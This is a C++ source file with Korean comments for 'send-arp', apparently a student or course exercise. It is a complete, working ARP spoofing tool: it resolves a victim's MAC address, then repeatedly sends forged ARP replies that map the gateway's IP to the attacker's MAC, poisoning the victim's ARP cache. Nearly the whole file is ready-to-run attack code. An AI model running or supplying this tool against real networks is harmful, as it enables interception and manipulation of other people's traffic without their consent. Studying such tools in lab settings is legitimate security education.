#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <ctime>
// Mac 주소
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <sys/socket.h>


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

Mac getMyMac(const char* interface) {
	// 소켓 생성
	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd == -1) {
		fprintf(stderr, "[-][MAC] 소켓 생성 실패\n");
		return Mac("00:00:00:00:00:00");
	}

	// ifreq 구조체 설정
	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
	ifr.ifr_name[IFNAMSIZ - 1] = '\0';

	// ioctl로 하드웨어 MAC 조회
	if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1) {
		fprintf(stderr, "[-][MAC] ioctl 실패 %s\n", interface);
		close(sockfd);
		return Mac("00:00:00:00:00:00"); // 기본값 반환
	}
	close(sockfd);

	// MAC 주소 추출 및 반환
	unsigned char* mac_bytes = (unsigned char*)ifr.ifr_hwaddr.sa_data;

	// MAC 주소를 문자열로 변환
	char mac_str[18];
	sprintf(mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
			mac_bytes[0], mac_bytes[1], mac_bytes[2],
		 mac_bytes[3], mac_bytes[4], mac_bytes[5]);

	return Mac(mac_str);
}

Ip getMyIp(const char* interface){
	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd == -1){
		fprintf(stderr, "[-][IP] 소켓 생성 실패\n");
		return Ip("0.0.0.0");
	}

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

	if (ioctl(sockfd, SIOCGIFADDR, &ifr) == -1) {
		fprintf(stderr, "[-][IP] ioctl 실패 %s\n", interface);
		close(sockfd);
		return Ip("0.0.0.0");
	}

	close(sockfd);

	struct sockaddr_in* addr_in = (struct sockaddr_in*)&ifr.ifr_addr;
	return Ip(ntohl(addr_in->sin_addr.s_addr));
}

Mac getSenderMac(pcap_t* pcap, const char* interface, Ip sender_ip, Mac my_mac){
	Ip my_ip = getMyIp(interface);
	if (my_ip == Ip("0.0.0.0")){
		fprintf(stderr, "[-] Get Ip 실패\n");
		return Mac("00:00:00:00:00:00");
	}

	EthArpPacket packet;

	// Ethernet Header
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");  // Broadcast
	packet.eth_.smac_ = my_mac;                     // My MAC
	packet.eth_.type_ = htons(EthHdr::Arp);         // ARP

	// ARP Header
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);        // Ethernet
	packet.arp_.pro_ = htons(EthHdr::Ip4);          // IPv4
	packet.arp_.hln_ = Mac::Size;                   // MAC length = 6
	packet.arp_.pln_ = Ip::Size;                    // IP length = 4
	packet.arp_.op_ = htons(ArpHdr::Request);       // ARP Request
	packet.arp_.smac_ = my_mac;                     // My MAC
	packet.arp_.sip_ = htonl(my_ip);                // My IP
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");   // Unknown target MAC
	packet.arp_.tip_ = htonl(sender_ip);            // Target IP

	// ARP 요청 전송
	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "[-] ARP 요청 실패 : %s\n", pcap_geterr(pcap));
		return Mac("00:00:00:00:00:00");
	}

	// ARP Reply 수신 대기
	struct pcap_pkthdr* header;
	const u_char* packet_data;
	time_t start_time = time(nullptr);
	const int timeout_seconds = 3;

	while (time(nullptr) - start_time < timeout_seconds) {
		int result = pcap_next_ex(pcap, &header, &packet_data);

		if (result == 0) continue;  // 타임아웃, 다시 시도
		if (result == -1) {         // 에러
			fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(pcap));
			break;
		}
		if (result == -2) break;    // EOF

		if (header->caplen < sizeof(EthArpPacket)) continue;  // 패킷 크기 확인

		EthArpPacket* reply_packet = (EthArpPacket*)packet_data;

		// Ethernet 타입이 ARP인지 확인
		if (ntohs(reply_packet->eth_.type_) != EthHdr::Arp) continue;

		// ARP Operation이 Reply인지 확인
		if (ntohs(reply_packet->arp_.op_) != ArpHdr::Reply) continue;

		// Sender IP가 요청한 IP와 일치하는지 확인
		if (ntohl(reply_packet->arp_.sip_) != sender_ip) continue;

		// Target IP가 내 IP와 일치하는지 확인 (나에게 온 응답인지)
		if (ntohl(reply_packet->arp_.tip_) != my_ip) continue;

		// Target MAC이 내 MAC과 일치하는지 확인
		if (reply_packet->arp_.tmac_ != my_mac) continue;

		return reply_packet->arp_.smac_;
	}

	// 타임아웃 또는 응답 없음
	fprintf(stderr, "[-] ARP 타임아웃 %s\n", std::string(sender_ip).c_str());
	return Mac("00:00:00:00:00:00");
}

void sendArpInfection(pcap_t* pcap, Mac my_mac, Ip sender_ip, Mac sender_mac, Ip target_ip) {
	// ARP Infection 패킷 생성
	EthArpPacket infection_packet;

	// Ethernet Header
	infection_packet.eth_.dmac_ = sender_mac;           // Victim의 MAC
	infection_packet.eth_.smac_ = my_mac;               // 내 MAC
	infection_packet.eth_.type_ = htons(EthHdr::Arp);   // ARP

	// ARP Header
	infection_packet.arp_.hrd_ = htons(ArpHdr::ETHER);  // Ethernet
	infection_packet.arp_.pro_ = htons(EthHdr::Ip4);    // IPv4
	infection_packet.arp_.hln_ = Mac::Size;             // MAC length = 6
	infection_packet.arp_.pln_ = Ip::Size;              // IP length = 4
	infection_packet.arp_.op_ = htons(ArpHdr::Reply);   // ARP Reply
	infection_packet.arp_.smac_ = my_mac;               // !!fake!!
	infection_packet.arp_.sip_ = htonl(target_ip);      // Gateway
	infection_packet.arp_.tmac_ = sender_mac;           // Victim MAC
	infection_packet.arp_.tip_ = htonl(sender_ip);      // Victim IP

	// 패킷 전송
	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&infection_packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "[-] ARP infection 실패 : %s\n", pcap_geterr(pcap));
		return;
	}
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return EXIT_FAILURE;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	// get my mac 주소
	Mac my_mac = getMyMac(dev);
	if (my_mac == Mac("00:00:00:00:00:00")) {
		fprintf(stderr, "[-][MAC] 실패 %s\n", dev);
		pcap_close(pcap);
		return EXIT_FAILURE;
	}
	printf("Interface: %s, MAC: %s\n", dev, std::string(my_mac).c_str());

	int pair_count = (argc - 2) / 2;
	for (int i = 2; i < argc; i += 2) {
		Ip sender_ip = Ip(argv[i]);
		Ip target_ip = Ip(argv[i + 1]);

		printf("\n[%d/%d] %s -> %s\n",
			   (i-2)/2 + 1, pair_count,
			   std::string(sender_ip).c_str(),
			   std::string(target_ip).c_str());

		// Get Sender MAC 주소
		printf("Getting %s MAC... ", std::string(sender_ip).c_str());
		Mac sender_mac = getSenderMac(pcap, dev, sender_ip, my_mac);

		if (sender_mac == Mac("00:00:00:00:00:00")) {
			printf("failed\n");
			continue;
		}

		printf("done (%s)\n", std::string(sender_mac).c_str());

		// ARP Spoofing
		printf("ARP infection... ");
		for (int j = 0; j < 20; j++) {  // 20 반복
			sendArpInfection(pcap, my_mac, sender_ip, sender_mac, target_ip);
			printf(".");
			fflush(stdout);  // 즉시 출력
			usleep(200000);  // 0.2초 대기
		}
		printf(" done\n");
		printf("done\n");
	}

	printf("\n완료\n");

	pcap_close(pcap);
	return 0;
}
